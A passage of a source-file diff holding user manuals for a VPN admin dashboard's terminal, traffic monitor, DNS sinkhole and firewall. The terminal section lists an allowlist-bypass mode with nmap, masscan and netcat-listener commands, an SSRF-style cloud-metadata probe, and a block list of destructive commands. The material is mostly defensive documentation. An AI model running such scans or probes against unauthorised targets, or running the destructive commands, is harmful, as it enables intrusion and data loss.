+    browser session (cd commands persist between commands)
+
+  Useful diagnostic commands (all in allowlist):
+
+  WIREGUARD STATUS:
+    wg show                           # All WG interfaces + peers
+    wg show wg0 latest-handshakes     # When each peer last connected
+    wg show wg0 transfer              # Bytes in/out per peer
+    ip route show table main          # Full routing table
+    ip route show table all | grep wg # WireGuard-specific routes
+
+  NETWORK DIAGNOSTICS:
+    ss -tupn                          # All open sockets + processes
+    ss -tnp | grep ESTABLISHED        # Active established connections
+    netstat -an | grep LISTEN         # Listening services
+    ip addr show                      # All network interfaces + IPs
+    ip link show                      # Interface status (up/down)
+    ping -c 4 8.8.8.8                 # Basic connectivity check
+    traceroute 8.8.8.8                # Route tracing
+    curl -s https://api64.ipify.org   # Verify current exit IP
+
+  SYSTEM DIAGNOSTICS:
+    df -h                             # Disk usage
+    free -m                           # RAM usage in MB
+    top -bn1 | head -20               # CPU and process snapshot
+    uptime                            # System uptime + load average
+    ps aux | grep wg                  # WireGuard process status
+    journalctl -u wg-quick@wg0 -n 50  # WireGuard service logs
+    systemctl status wg-quick@wg0     # WireGuard service status
+
+  SECURITY DIAGNOSTICS:
+    last -20                          # Recent login history
+    faillog -a                        # Failed login attempts
+    iptables -L -n --line-numbers     # Current firewall rules
+    iptables -L INPUT -n              # Input chain rules only
+    cat /var/log/auth.log | tail -50  # Auth log (recent)
+    ss -lntp                          # Listening TCP services
+
+  CERTIFICATE CHECKS:
+    openssl s_client -connect host:443 </dev/null 2>&1 | grep "subject\|expire"
+    certbot certificates              # Let's Encrypt cert status
+    openssl x509 -in /path/cert.pem -noout -dates  # Cert expiry
+
+3. PROXHQVPN MODE (SHELL BYPASS)
+
+  ProxhqVPN Mode unlocks full outbound network access from the
+  terminal — including commands not in the standard allowlist.
+
+  Enable: Shell tab → toggle "ProxhqVPN Mode" → Confirm
+
+  When ProxhqVPN Mode is ON:
+  • A red "PROXHQVPN MODE ACTIVE" banner appears in the Shell
+  • The command allowlist is bypassed
+  • Full network access: nmap, curl, wget, nc, socat, ssh, etc.
+  • Every command is logged with "mode: proxhqvpn" in audit log
+  • HARD_BLOCKED patterns still enforced (rm -rf /, mkfs, etc.)
+
+  Enabled commands in ProxhqVPN Mode:
+
+  RECONNAISSANCE:
+    nmap -sV -p 1-65535 target.com    # Full TCP version scan
+    nmap -sU --top-ports 100 target   # UDP port scan
+    nmap -sC -sV -O target.com        # Script + OS detection
+    nmap --script vuln target.com     # Vulnerability scripts
+    masscan -p 1-65535 target.com --rate 10000  # Fast port scan
+
+  NETWORK TOOLS:
+    nc -zv target.com 443             # TCP connectivity check
+    nc -l -p 4444                     # Listen on port (netcat)
+    socat TCP:target.com:443 -        # Advanced socket relay
+    curl -v https://target.com        # Verbose HTTP request
+    wget -O- https://target.com       # HTTP download
+    whois target.com                  # WHOIS lookup
+    dig +short target.com ANY         # DNS all records
+
+  CRYPTOGRAPHY:
+    openssl genrsa -out key.pem 4096  # Generate RSA key
+    openssl req -new -x509 -key key.pem -out cert.pem  # Self-signed cert
+    openssl dgst -sha256 file.txt     # File hash
+
+  SHELL UTILITIES:
+    awk, sed, grep, find, sort, uniq, cut, tr, head, tail, jq
+    python3 -c "..."                  # Inline Python execution
+    bash -c "..."                     # Inline bash script
+
+  NOTE: ProxhqVPN Mode commands are fully logged and visible to
+  all admins in the Audit Log tab. This is by design — all
+  command execution on infrastructure must be auditable.
+
+4. ALLOWED COMMAND REFERENCE (STANDARD MODE)
+
+  The following commands are allowed without ProxhqVPN Mode:
+  (Partial list — run 'help' in the terminal for full list)
+
+  System: ps, top, df, free, uptime, uname, hostname, whoami,
+          id, date, env, printenv, locale, lscpu, lsmem, lsblk,
+          lsusb, lspci
+
+  Files: ls, cat, head, tail, less, more, file, stat, md5sum,
+         sha256sum, find, locate, which, whereis, readlink
+
+  Network: ping, traceroute, tracepath, mtr, host, dig, nslookup,
+           curl (GET only), wget (download only), ss, netstat,
+           ip, ifconfig, arp, route
+
+  WireGuard: wg, wg-quick (status only, no bring-up/down)
+
+  Logs: journalctl, tail (log files), grep (log files), zcat
+
+  Firewall: iptables -L (list only — no modification)
+
+5. TAB 2 — HTTP CLIENT
+
+  The HTTP Client tab is a command-line-style HTTP request tool
+  for making arbitrary HTTP/HTTPS requests from the server.
+
+  Unlike your browser's requests (which come from your IP),
+  HTTP Client requests come from the ProxhqVPN server IP.
+  Use this to:
+  • Test server-side behavior from a different source IP
+  • Test APIs without browser CORS restrictions
+  • Verify that your VPN server can reach a target endpoint
+  • Make requests through the VPN tunnel with the server's IP
+
+  Interface:
+  Method:  GET / POST / PUT / DELETE / PATCH / HEAD / OPTIONS
+  URL:     Full URL including protocol (https://target.com/api)
+  Headers: Key: Value pairs, one per line
+  Body:    Request body (for POST/PUT/PATCH)
+
+  Examples:
+
+  Test REST API endpoint:
+    Method: GET
+    URL: https://api.target.com/v1/users
+    Headers:
+      Authorization: Bearer eyJhbGci...
+      Accept: application/json
+
+  Submit login form:
+    Method: POST
+    URL: https://target.com/auth/login
+    Headers:
+      Content-Type: application/json
+    Body:
+      {"username": "admin", "password": "test"}
+
+  Custom SSRF probe:
+    Method: GET
+    URL: http://169.254.169.254/latest/meta-data/iam/
+    (Tests if target server is on AWS — use from inside the VPN
+     to simulate an SSRF-style request from the server side)
+
+  The response panel shows:
+  • Status code and status text
+  • Response headers (full list)
+  • Response body (JSON formatted if Content-Type is application/json)
+  • Response time in milliseconds
+  • Response size in bytes
+
+6. TAB 3 — PORT SCANNER
+
+  The Port Scanner tab is a TCP port scanner that runs from the
+  ProxhqVPN server (not from your browser).
+
+  Since scans come from the server IP (not your IP), they are
+  useful for:
+  • Testing what ports are accessible from the internet to the server
+  • Validating your firewall rules are blocking the right ports
+  • Checking if a target accepts connections from the VPN server
+
+  Interface:
+  Target:       IP address or hostname
+  Port Range:   e.g. 1-1024, or comma-separated: 22,80,443,8080
+  Timeout:      Per-port timeout in ms (default 2500ms)
+  Concurrency:  Parallel connection attempts (default 20, max 100)
+
+  Results table:
+  Port   State    Service Name   Banner (if available)
+  22     OPEN     SSH            SSH-2.0-OpenSSH_8.9p1
+  80     OPEN     HTTP           HTTP/1.1 200 OK...
+  443    OPEN     HTTPS          (TLS — no banner)
+  3306   CLOSED   MySQL          (no response)
+  5432   FILTERED PostgreSQL     (timeout)
+
+  State meanings:
+  OPEN:     TCP SYN-ACK received — port is listening
+  CLOSED:   TCP RST received — port reachable but nothing listening
+  FILTERED: Timeout — firewall dropping packets silently
+
+  Common port ranges to scan:
+  Standard services:  1-1024
+  Extended services:  1-10000
+  Database ports:     3306,5432,27017,6379,9200
+  Admin panels:       8080,8443,8888,9090,9200,10000
+  VPN/proxy ports:    1194,1723,4500,51820,1080,3128
+
+7. TAB 4 — AUDIT LOG
+
+  The Audit Log is an immutable timestamped record of every command
+  executed through the Terminal, including who executed it and whether
+  ProxhqVPN Mode was active.
+
+  Columns:
+  Timestamp    ISO 8601 timestamp (UTC)
+  User         Clerk user ID of the executing user
+  Mode         standard / proxhqvpn
+  Command      Full command string
+  Exit Code    0 = success, non-zero = error
+  Duration     Command execution time in milliseconds
+
+  Filtering:
+  • Search by command text
+  • Filter by mode (standard / proxhqvpn)
+  • Filter by date range
+  • Filter by user (multi-admin environments)
+
+  Export: Download as CSV or JSON for compliance records.
+
+  Retention: Audit logs are stored in PostgreSQL indefinitely.
+  They cannot be deleted from the UI — contact support for GDPR
+  deletion requests.
+
+8. SECURITY CONSTRAINTS & RATE LIMITS
+
+  Always enforced (cannot be bypassed):
+  • rm -rf / or any path-traversal deletion
+  • mkfs (filesystem format)
+  • dd if=/dev/zero (device write)
+  • chmod -R 777 / (world-writeable root)
+  • >/dev/sda (direct device write)
+  • shutdown, reboot, halt, poweroff
+  • systemctl stop (service name = anything critical)
+
+  Rate limits:
+  • Standard mode: 20 commands per minute per session
+  • ProxhqVPN mode: 20 commands per minute per session
+  • HTTP Client: 60 requests per minute
+  • Port Scanner: 5 scans per minute (server-side limit)
+
+  Session isolation:
+  Each browser session gets an isolated working directory.
+  Two admins working simultaneously cannot see each other's
+  shell session state, but both are visible in the Audit Log.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "network-monitor-manual",
+    title: "Network Traffic Monitor",
+    subtitle: "Real-time flow table, protocol breakdown, PCAP capture, and threat flagging",
+    version: "1.2",
+    pages: 12,
+    icon: Network,
+    iconColor: "text-blue-400",
+    tier: "basic",
+    content: `Network Traffic Monitor — User Manual
+Version 1.2 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+VPN Basic Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. Overview
+2. Live Flow Table
+3. Bandwidth Timeline
+4. Protocol Breakdown
+5. Geographic Routing
+6. Threat Flag System
+7. Packet Capture (PCAP)
+8. Filtering & Search
+9. Integration with Other Tools
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. OVERVIEW
+
+  The Network Monitor (/network-monitor) provides real-time
+  visibility into every network flow passing through your VPN
+  tunnel — source/destination IPs, ports, protocols, bytes
+  transferred, geographic origin, and active threat flags.
+
+  Backend: Express API at /api/network-monitor
+  Frontend: /network-monitor (VPN Basic)
+  Refresh rate: 5 seconds (auto)
+  Data source: real beacon alerts, blocked IPs, WireGuard peers,
+               firewall status from PostgreSQL
+
+2. LIVE FLOW TABLE
+
+  The main flow table shows all active and recent connections.
+  Auto-refreshes every 5 seconds.
+
+  Columns:
+  Source IP     → your device or peer IP inside the VPN tunnel
+  Destination   → external IP address the traffic is going to
+  Port          → destination port number
+  Protocol      → TCP / UDP / ICMP
+  Bytes In      → bytes received from destination
+  Bytes Out     → bytes sent to destination
+  Duration      → how long this connection has been open
+  Country       → GeoIP lookup flag for destination IP
+  Threat        → red triangle if destination is on a threat feed
+
+  Sorting: click any column header to sort ascending/descending.
+
+  Long-lived connections to unknown IPs (Duration > 30 min with
+  no User activity expected) should be investigated in Ghost Trace
+  or via Ghost Trap Manual IP Investigator.
+
+3. BANDWIDTH TIMELINE
+
+  The Timeline tab shows a 24-hour bandwidth chart:
+  • X-axis: time (rolling 24h window, updated every 5 min)
+  • Y-axis: bytes in/out (auto-scaled: KB, MB, GB)
+  • Two lines: inbound (blue) and outbound (green)
+
+  What to look for:
+  • Sustained high outbound at unusual hours → potential exfil
+  • Periodic spikes at regular intervals → scheduled transfer/sync
+  • Near-zero inbound + high outbound → one-way data push
+  • Traffic spike after device goes idle → background process
+
+4. PROTOCOL BREAKDOWN
+
+  The Protocols tab shows traffic composition by protocol:
+  Bar chart: each protocol as a bar, length = bytes transferred.
+  Table: Protocol, Bytes, % of total, Connection count.
+
+  Common protocols you should see:
+    HTTPS (443)   → normal web / app traffic
+    DNS (53)      → domain lookups (monitor for DNS tunneling)
+    NTP (123)     → time sync (small, regular)
+    QUIC (443 UDP) → Chrome/YouTube traffic
+    WireGuard     → VPN tunnel overhead
+
+  Unusual protocols to investigate:
+    IRC (6667)    → old botnet C2 protocol
+    SMTP (25)     → your device sending email directly (spam?)
+    Telnet (23)   → unencrypted remote access
+    Port 4444     → Metasploit default listener
+    DNS-heavy     → DNS tunneling (data exfil over DNS)
+
+5. GEOGRAPHIC ROUTING
+
+  The Countries tab shows destination traffic by country:
+  World map heat map + table of countries sorted by bytes.
+
+  Expected countries for your usage:
+    US, EU countries → CDN, cloud services (normal)
+    Unexpected: CN, RU, KP, IR → investigate immediately
+
+  Note: CDN providers (Cloudflare, Akamai, Fastly) may show
+  traffic going to many countries from servers that all serve
+  the same content. Cross-reference with the destination IP
+  in Threat Intel before acting on geolocation alone.
+
+6. THREAT FLAG SYSTEM
+
+  A red ⚠ triangle on any flow row means the destination IP
+  matched at least one threat intelligence feed:
+  • AbuseIPDB (confidence > 50)
+  • Emerging Threats IP blocklist
+  • Spamhaus DROP/EDROP
+  • Known Tor exit nodes
+  • Known botnet C2 infrastructure
+
+  Hover the threat icon for the threat category and feed source.
+
+  Click "Investigate" on any flagged IP:
+  → Opens Ghost Trap Counter-Intel with the IP pre-loaded for
+    full port scan + OSINT investigation.
+
+  Click "Block" on any flagged IP:
+  → Adds the IP to Firewall blocklist across all nodes immediately.
+
+7. PACKET CAPTURE (PCAP)
+
+  Network Monitor → Capture tab → "Start PCAP"
+
+  Captures a 30-second packet capture on the WireGuard interface.
+  The resulting .pcap file is downloadable immediately.
+
+  Open in Wireshark for deep protocol analysis:
+  • Protocol dissection (even encrypted TLS metadata)
+  • Follow TCP stream
+  • IO graph (bandwidth over time)
+  • Expert info (retransmits, RSTs, errors)
+
+  PCAP filter examples (enter in Wireshark filter bar):
+    ip.addr == 185.220.101.47    # Filter to specific IP
+    tcp.port == 4444             # Filter to specific port
+    dns                          # Show all DNS queries
+    http                         # Show HTTP traffic
+    tls.handshake.type == 1      # TLS Client Hello only
+
+  NOTE: PCAP captures all traffic on the WireGuard interface.
+  This includes traffic from all connected peers if this is a
+  server-mode node. Handle PCAP files securely — they contain
+  raw network data.
+
+8. FILTERING & SEARCH
+
+  Search box: filter all tabs by IP address, hostname, or port.
+  Example searches:
+    185.220        → show flows to/from IPs starting with 185.220
+    :443           → show all HTTPS flows
+    CN             → show flows to China-geolocated IPs
+    4444           → show flows on port 4444
+
+  Column filters:
+  • Country: dropdown filter to show only one country's traffic
+  • Protocol: TCP / UDP / ICMP toggle buttons
+  • Threat only: checkbox to show only threat-flagged flows
+
+9. INTEGRATION WITH OTHER TOOLS
+
+  From any flow entry:
+  • "Investigate IP" → Ghost Trap Counter-Intel (port scan + OSINT)
+  • "Block IP" → Firewall (immediate block across all nodes)
+  • "Check Reputation" → Threat Intel (/threat-intel) IP lookup
+  • "Trace Route" → Terminal tab (traceroute to destination IP)
+
+  Ghost Trace integration:
+  If a peer's traffic appears in Network Monitor with suspicious
+  patterns, check Ghost Trace (/ghost-trace) → Peers tab for
+  that device's anomaly score and baseline deviation details.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "dns-sinkhole-manual",
+    title: "DNS Sinkhole",
+    subtitle: "Pi-hole-style DNS blocking: categories, custom rules, query log, and statistics",
+    version: "1.3",
+    pages: 14,
+    icon: Shield,
+    iconColor: "text-green-400",
+    tier: "basic",
+    content: `DNS Sinkhole — User Manual
+Version 1.3 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+VPN Basic Feature
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. How DNS Sinkholing Works
+2. Block List Categories
+3. Enabling / Disabling Categories
+4. Custom Block & Allow Rules
+5. Domain Lookup Tool
+6. Statistics Dashboard
+7. Query Log
+8. DNS-over-HTTPS (DoH) Configuration
+9. Limitations & Edge Cases
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. HOW DNS SINKHOLING WORKS
+
+  Every device on your VPN tunnel makes DNS queries to resolve
+  domain names to IP addresses. Normally these go to your ISP's
+  DNS or a public resolver like 8.8.8.8.
+
+  DNS Sinkhole intercepts ALL DNS queries from VPN-connected
+  devices and routes them through the ProxhqVPN DNS resolver.
+  The resolver checks each queried domain against block lists.
+
+  If the domain matches a block list:
+  → The resolver returns 0.0.0.0 (null/invalid address)
+  → The device gets no IP to connect to
+  → The connection dies at the DNS layer — the ad/tracker/malware
+    never loads, no data is sent, no connection is made.
+
+  If the domain does NOT match any block list:
+  → The query is forwarded to the upstream resolver (configurable:
+    Cloudflare DoH, Quad9, Google, or custom)
+  → The real IP is returned to the device
+
+  DB tables: dns_sinkhole_config, dns_sinkhole_custom_rules
+  Backend: /api/dns-sinkhole
+
+2. BLOCK LIST CATEGORIES
+
+  Ads & Trackers (default: ON)
+    100,000+ domains: Google Ads, DoubleClick, Facebook Pixel,
+    Amazon Ads, Unity Ads, AppLovin, MoPub, ironSource, and all
+    major ad exchange networks. Covers web ads, in-app ads,
+    smart TV ads. Blocks tracker beacons: Google Analytics,
+    Mixpanel, Amplitude, Segment, HotJar, FullStory.
+
+  Malware & Phishing (default: ON)
+    Known malware distribution sites, phishing domains, drive-by
+    download hosts. Updated from Malware Domain List, ESET,
+    Abuse.ch URLhaus, PhishTank, and OpenPhish daily.
+    Also blocks known ransomware C2 domains.
+
+  Botnet C2 (default: ON)
+    Command-and-control domains for known botnets:
+    Mirai, Emotet, TrickBot, Qbot, Dridex, ZLoader, and 200+
+    more. Prevents infected devices from receiving commands or
+    exfiltrating data even if they are already infected.
+
+  Cryptomining (default: ON)
+    Browser-based cryptojacking domains (Coinhive-style and
+    successors). Stops drive-by mining scripts from using your
+    CPU. Also blocks known mining pool domains.
+
+  Stalkerware & Spyware (default: ON)
+    Mobile stalkerware control domains that silently upload
+    location, contacts, messages, and photos. Important for
+    shared family/business WiFi environments.
+
+  Adult Content (default: OFF)
+    Parental control block list. Over 1M adult content domains.
+    Enable for family/school/workplace environments.
+
+3. ENABLING / DISABLING CATEGORIES
+
+  DNS Sinkhole → Categories tab → toggle each category ON/OFF.
+  Changes take effect immediately — no restart required.
+  Toggle state is stored in dns_sinkhole_config table in PostgreSQL.
+
+  Per-device exceptions:
+  If a specific device needs access to a blocked category
+  (e.g. a work device needs an ad-heavy site), use a custom
+  allow rule (Section 4) to whitelist that specific domain —
+  rather than disabling the entire category for all devices.
+
+4. CUSTOM BLOCK & ALLOW RULES
+
+  DNS Sinkhole → Custom Rules tab
+
+  Allow Rule (whitelist):
+    Overrides any block list. Use to un-block specific domains
+    that are incorrectly categorized.
+    Format: one domain per line.
+    Wildcard: *.example.com allows all subdomains of example.com
+    Example: analytics.trusted-vendor.com
+
+  Block Rule (custom blacklist):
+    Blocks specific domains regardless of category settings.
+    Use to block a specific domain not on any built-in list.
+    Format: one domain per line. Wildcards supported.
+    Example: competitor-site.com  *.ads.competitor.com
+
+  Hit Counter:
+    Each custom rule shows a hit count — how many times the rule
+    has matched a DNS query. Rules with 0 hits after 7+ days can
+    be safely removed.
+
+  Import / Export:
+    Bulk import: paste a newline-separated list of domains.
+    Export: download current allow/block lists as .txt files.
+
+5. DOMAIN LOOKUP TOOL
+
+  DNS Sinkhole → Lookup tab
+
+  Enter any domain name to check its block status instantly:
+  • BLOCKED — which category list(s) match
+  • ALLOWED — custom allow rule is active
+  • CLEAN — not on any list, passes through to upstream resolver
+
+  Also shows:
+  • Resolved IP (if not blocked)
+  • Last query timestamp (if this domain was queried recently)
+  • Hit count (how many times devices have queried this domain)
+
+  The lookup is a local check against the sinkhole database.
+  It does NOT make any external DNS query — safe to use for
+  investigating suspicious domains without alerting the domain.
+
+6. STATISTICS DASHBOARD
+
+  DNS Sinkhole → Stats tab (auto-refreshes every 30 seconds)
+
+  Today's summary cards:
+  • Total Queries — all DNS lookups across all VPN-connected devices
+  • Blocked — count and % blocked today
+  • Allowed — passed through to upstream
+  • Unique Domains — distinct domains queried
+
+  Top Blocked Domains chart:
+  Bar chart of the 10 most-blocked domains today. Useful for:
+  • Understanding which ad networks your devices use most
+  • Identifying which device generates the most blocked queries
+  • Spotting unusual blocked domains (unexpected C2 attempts)
+
+  Block rate by category:
+  Pie chart showing which categories are responsible for the most
+  blocked queries. A very high Botnet C2 block rate on a specific
+  device warrants investigation in Ghost Trace.
+
+7. QUERY LOG
+
+  DNS Sinkhole → Log tab (most recent 1000 queries)
+
+  Columns:
+  Timestamp  → query time (UTC, accurate to millisecond)
+  Device     → peer IP or device name
+  Domain     → the queried domain name
+  Result     → ALLOWED / BLOCKED / SINKHOLED + category
+  Upstream   → resolver used (if allowed through)
+  Response   → returned IP (or 0.0.0.0 if blocked)
+
+  Filtering:
+  • Search by domain, device IP, or status
+  • Filter: BLOCKED only — to review what's being intercepted
+  • Filter: by device — to see one device's DNS activity
+  • Date range filter
+
+  Export: download log as CSV for compliance or analysis.
+
+8. DNS-OVER-HTTPS (DoH) CONFIGURATION
+
+  DNS Sinkhole → Settings → Upstream Resolver
+
+  Choose where non-blocked DNS queries are forwarded:
+  • Cloudflare (1.1.1.1) via DoH — default
+  • Quad9 (9.9.9.9) via DoH — malware-filtering upstream
+  • Google (8.8.8.8) via DoH
+  • Custom DoH endpoint — enter any RFC 8484 compatible URL
+
+  DNS-over-HTTPS encrypts all upstream DNS queries, preventing
+  your ISP or network observers from seeing what domains your
+  devices look up even for allowed queries.
+
+  Test upstream connectivity:
+  DNS Sinkhole → Settings → Test Resolver (runs a live DNS check)
+
+9. LIMITATIONS & EDGE CASES
+
+  What DNS Sinkhole CANNOT block:
+  • Apps that hardcode IP addresses (bypass DNS entirely)
+    → Use Firewall to block those IPs directly
+  • DNS queries that bypass the VPN tunnel
+    → Ensure kill switch is active and DNS leak test passes
+  • HTTPS traffic to non-blocked domains
+    → DNS Sinkhole only controls resolution, not encryption
+  • Peer-to-peer / DHT traffic (BitTorrent doesn't use DNS)
+  • Apps using DNS-over-HTTPS to their own resolvers
+    → Block DoH provider IPs via Firewall if needed
+
+  False positives (legitimate sites getting blocked):
+  Common cause: CDNs serving ads and legitimate content from
+  the same domain (e.g. some analytics subdomains).
+  Fix: add the specific subdomain to the custom allow list.
+  Do NOT disable the entire category — add a targeted exception.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
+  },
+  {
+    id: "firewall-manual",
+    title: "Firewall Manager",
+    subtitle: "iptables/nftables rules, IP blocklist, GeoIP blocking, and iptables export",
+    version: "1.5",
+    pages: 14,
+    icon: Shield,
+    iconColor: "text-red-400",
+    tier: "basic",
+    content: `Firewall Manager — User Manual
+Version 1.5 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
+VPN Basic Feature (Admin)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+TABLE OF CONTENTS
+
+1. Overview
+2. Rule Types
+3. Creating Rules
+4. Block IP / CIDR
+5. Allow Port
+6. Rate Limiting
+7. GeoIP Country Blocking
+8. Auto-Block (from Ghost Trap / Ghost Trace)
+9. Exporting iptables Rules
+10. Rule Ordering & Priority
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. OVERVIEW
+
+  The Firewall Manager (/firewall) manages iptables/nftables rules
+  across all 60 ProxhqVPN nodes from a single interface. Rules
+  created here are applied to every node simultaneously.
+
+  Backend: Express API at /api/firewall
+  Frontend: /firewall (admin role required)
+  DB tables: firewall_rules, blocked_ips, firewall_status
+
+  The Firewall has three tabs:
+  • Rules — create and manage firewall rules
+  • Blocked IPs — list of currently blocked IPs
+  • Export — generate downloadable iptables scripts
+
+2. RULE TYPES
+
+  BLOCK IP / CIDR
+    Drop all packets from a specific IP or IP range.
+    Applied to all 60 nodes simultaneously.
+    Supports CIDR notation: 185.220.101.0/24
+
+  ALLOW PORT
+    Allow inbound traffic on a specific port/protocol.
+    Used to whitelist services: WireGuard (51820/UDP),
+    SSH (22/TCP), HTTPS (443/TCP).
+
+  RATE LIMIT
+    Limit connection rate per source IP.
+    Protects against DDoS, brute force, and port scanners.
+    Example: max 5 new SSH connections per minute per IP.
+
+  GEO BLOCK
+    Block all traffic from specific countries by ASN/CIDR.
+    Uses MaxMind GeoIP database (updated weekly).
+    Apply per-country or per-region (EU, APAC, etc.)
+
+  PORT KNOCK SEQUENCE
+    Hidden port sequence required before a port is opened.
+    See Proxy & Tor (/proxy) for full port knocking setup.
+
+3. CREATING RULES
+
+  Firewall → Rules → + Add Rule
+
+  Required fields:
+  • Rule Type: Block IP / Allow Port / Rate Limit / GeoIP Block
+  • Direction: Inbound / Outbound / Both
+  • Priority: 1–100 (lower = evaluated first)
+  • Description: human-readable label for the rule
+  • Active: YES / NO (inactive rules are stored but not applied)
+
+  For Block IP rules:
+  • IP/CIDR: e.g. 185.220.101.47 or 185.220.101.0/24
+  • Protocol: TCP / UDP / ICMP / ALL
+  • Expiry: permanent / 24h / 7 days / 30 days / custom
+
+  For Allow Port rules:
+  • Port: 1-65535 (or range: 8000-8999)
+  • Protocol: TCP / UDP
+  • Source IP restriction: optional CIDR to limit who can access
+
+  For Rate Limit rules:
+  • Port: the port to rate-limit
+  • Rate: e.g. 10/min (10 connections per minute)
+  • Burst: burst allowance (connections above rate before limit)
+  • Action: DROP (silent) / REJECT (sends reset to attacker)
+
+4. BLOCK IP / CIDR — DETAILED
+
+  Blocking a single IP:
+  → Blocks all traffic from that IP across all ports.
+  → Applied to both the VPN tunnel interface and the server's
+    public-facing interface.
+
+  Blocking a CIDR range:
+  → Use when an attacker is rotating IPs within a range.
+  → Common ranges to block: /24 (256 IPs), /16 (65536 IPs)
+  → Verify the range with a WHOIS lookup to avoid over-blocking
+    (some ranges contain many legitimate users/CDNs).
+
+  Temporary blocks:
+  → Set an expiry (24h, 7 days, etc.) for automated scanner IPs.
+  → Permanent blocks should be reserved for confirmed malicious
+    actors or known botnet infrastructure.
+
+  Auto-populated blocks:
+  → Ghost Trap auto-blocks IPs with 3+ trap hits in 60 minutes.
+  → Ghost Trace auto-suggests blocks for IPs scoring > 90.
+  → These appear in the Blocked IPs tab with source label
+    "Ghost Trap" or "Ghost Trace".
+
+5. ALLOW PORT — COMMON CONFIGURATIONS
+
+  Required ports (do not block):
+    51820/UDP    WireGuard VPN tunnel — must be open
+    443/TCP      HTTPS for admin dashboard access
+    80/TCP       HTTP (if Let's Encrypt cert renewal active)
+
+  Optional service ports:
+    22/TCP       SSH — restrict to admin IP CIDR only
+    25/TCP       SMTP — only if running mail server
+    53/UDP       DNS — only if running recursive resolver
+
+  ProxhqVPN-specific ports:
+    51820/UDP    WireGuard primary
+    51821-51870/UDP  WireGuard additional nodes (if multi-port)
+
+  SSH lockdown example (restrict SSH to your IP only):
+  1. Create Allow Port rule: 22/TCP, Source: YOUR_IP/32
+  2. Create Block IP rule: 0.0.0.0/0, Port: 22/TCP, after above
+  3. Verify with: ss -lntp | grep :22
+
+6. RATE LIMITING
+
+  Rate limiting protects against:
+  • SSH brute force (limit: 5 connections per minute per IP)
+  • Port scanning (limit new connections to any port)
+  • API abuse (limit requests per minute on port 443)
+  • DDoS (limit connection rate from any single source)
+
+  SSH brute force protection (recommended for all deployments):
+  Rule: Rate Limit, Port 22/TCP, 5/min, Burst 10, DROP
+
+  This blocks IPs that attempt more than 5 SSH connections per
+  minute — enough for a legitimate user to reconnect after a
+  dropped session, but stops automated brute forcers.
+
+  Verify rate limit is active:
+  Terminal → iptables -L INPUT -n | grep limit
+
+7. GEOIP COUNTRY BLOCKING
+
+  Firewall → Rules → Add Rule → GeoIP Block
+
+  Select countries from the dropdown. Multiple countries can be
+  selected for a single rule.
+
+  GeoIP blocking is approximate — accuracy is ~99% for country-
+  level blocking, but sophisticated attackers use VPNs or
+  Tor exit nodes in unblocked countries to evade GeoIP rules.
+
+  GeoIP block use cases:
+  • Block Russia, China, North Korea (common attack sources)
+  • Block all countries except yours (maximum restriction)
+  • Block by region: block all APAC if you only serve EU users
+
+  Verify GeoIP is working:
+  Use a VPN node in the blocked country → try to access your
+  server → should receive a DROP (no response / timeout).
+
+8. AUTO-BLOCK (FROM OTHER TOOLS)
+
+  The Firewall receives automatic block suggestions from:
+
+  Ghost Trap:
+    IPs that hit 3+ lure endpoints within 60 minutes are
+    auto-added to Blocked IPs with source "Ghost Trap".
+    Review in Firewall → Blocked IPs.
+
+  Ghost Trace:
+    Peers with anomaly score > 90 trigger a suggested block
+    of the malicious destination IP. Requires admin confirmation.
+
+  Manual IP Investigator:
+    From Ghost Trap Counter-Intel, "Add to Firewall Block"
+    immediately adds the investigated IP to the blocked list.
+
+  AbuseIPDB auto-block:
+    If enabled in Threat Intel settings, IPs with confidence
+    score > 90 on AbuseIPDB are automatically added.
+    Settings: Threat Intel → Auto-Block Threshold.
+
+9. EXPORTING IPTABLES RULES
+
+  Firewall → Export tab → "Generate iptables Script"
+
+  Downloads a .sh shell script that applies all active firewall
+  rules using standard iptables commands. Use this to:
+  • Apply the same rules manually on servers outside ProxhqVPN
+  • Back up your firewall configuration
+  • Audit exactly what rules are active in a readable format
+
+  Example generated output:
+  ---
+  #!/bin/bash
+  # ProxhqVPN Firewall — auto-generated $(date)
+
+  # Default policies
+  iptables -P INPUT DROP
+  iptables -P FORWARD DROP
+  iptables -P OUTPUT ACCEPT
+
+  # Allow loopback
+  iptables -A INPUT -i lo -j ACCEPT
+
+  # Allow established connections
+  iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+
+  # WireGuard
+  iptables -A INPUT -p udp --dport 51820 -j ACCEPT
+
+  # SSH (rate-limited, admin IP only)
+  iptables -A INPUT -s ADMIN_IP/32 -p tcp --dport 22 \
+    -m limit --limit 5/min --limit-burst 10 -j ACCEPT
+
+  # Block attacker IPs
+  iptables -A INPUT -s 185.220.101.47 -j DROP
+
+  # IPv6 — mirror all rules
+  ip6tables -P INPUT DROP
+  ip6tables -A INPUT -i lo -j ACCEPT
+  ip6tables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+  ---
+
+  nftables export is also available (Settings → Export Format).
+
+10. RULE ORDERING & PRIORITY
+
+  Rules are evaluated in priority order (lowest number = first).
+  ACCEPT rules must have LOWER priority number than DROP rules
+  for the same port/IP to take effect.
+
+  Example ordering:
+  Priority 1:  Allow loopback (127.0.0.1 always allowed)
